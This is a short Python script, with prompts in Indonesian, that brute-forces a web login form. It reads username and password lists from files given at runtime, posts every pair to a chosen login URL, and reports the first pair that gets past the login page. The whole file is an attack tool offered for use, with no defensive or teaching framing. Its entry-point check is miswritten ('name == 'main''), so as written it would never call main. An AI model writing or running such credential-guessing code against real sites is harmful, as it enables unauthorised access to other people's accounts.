import requests

def bruteforce(url, usernames, password_list):
    for username in usernames:
        for password in password_list:
            try:
                data = {'username': username, 'password': password}
                response = requests.post(url, data=data, timeout=5)
                if 'login' not in response.url:
                    print(f'\033[92m[+] Username: {username}, Password: {password} \033[0m')
                    return
            except requests.exceptions.RequestException as e:
                print(f'\033[91m[-] Error: {e} \033[0m')
    print('\033[91m[-] Password tidak ditemukan \033[0m')

def main():
    url = input('\033[94mMasukkan URL login: \033[0m')
    usernames = open(input('\033[94mMasukkan lokasi file usernames: \033[0m'), 'r').read().splitlines()
    password_list = open(input('\033[94mMasukkan lokasi file password list: \033[0m'), 'r').read().splitlines()

    bruteforce(url, usernames, password_list)

if name == 'main':
    main()


🗿🗿🗿🗿🗿🗿🗿
